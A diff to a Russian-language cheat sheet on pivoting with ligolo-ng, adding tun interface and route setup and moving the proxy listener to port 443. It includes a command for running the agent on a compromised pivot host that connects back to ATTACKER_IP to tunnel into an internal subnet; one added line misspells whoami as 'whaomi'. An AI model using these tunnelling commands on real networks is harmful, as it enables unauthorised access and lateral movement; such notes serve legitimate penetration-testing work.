@@ -30,16 +30,31 @@
 
 # Использование
 
+
+## 0) Создание сетевого интерфейса
+
+```bash
+sudo ip tuntap add user $(whaomi) mode tun ligolo
+
+sudo ip link set ligolo up
+```
+
+## 1) Создание маршрута
+
+```bash
+sudo ip route add 172.16.8.0/24 dev ligolo
+```
+
 ## Простой Pivot (1 промежуточный хост)
 
 1) На атакующей запускаем 
 ```bash
-ligolo-ng proxy --selfcert
+ligolo-ng proxy --selfcert -laddr 0.0.0.0:443
 ```
 
 2) На Pivot хосте запускаем
 ```bash
-agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+agent.exe -connect ATTACKER_IP:443 -ignore-cert
 ```
 
 
